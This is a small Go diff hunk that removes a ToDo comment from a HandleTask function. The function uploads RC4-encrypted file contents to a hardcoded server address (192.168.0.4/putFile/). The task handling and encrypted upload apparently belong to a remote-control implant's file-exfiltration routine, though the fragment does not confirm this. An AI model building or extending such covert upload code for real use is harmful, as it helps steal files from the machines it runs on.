@@ -106,7 +106,6 @@ func HandleTask(task string) ([]byte, error) {
 		}
 
 		fileName := filepath.Base(fileToUpload)
-		// ToDo - make file upload IP address dynamic
 		url := "https://192.168.0.4/putFile/" + fileName
 
 		result, err := files.PostFileToServer(url, rc4EncryptedFileData)
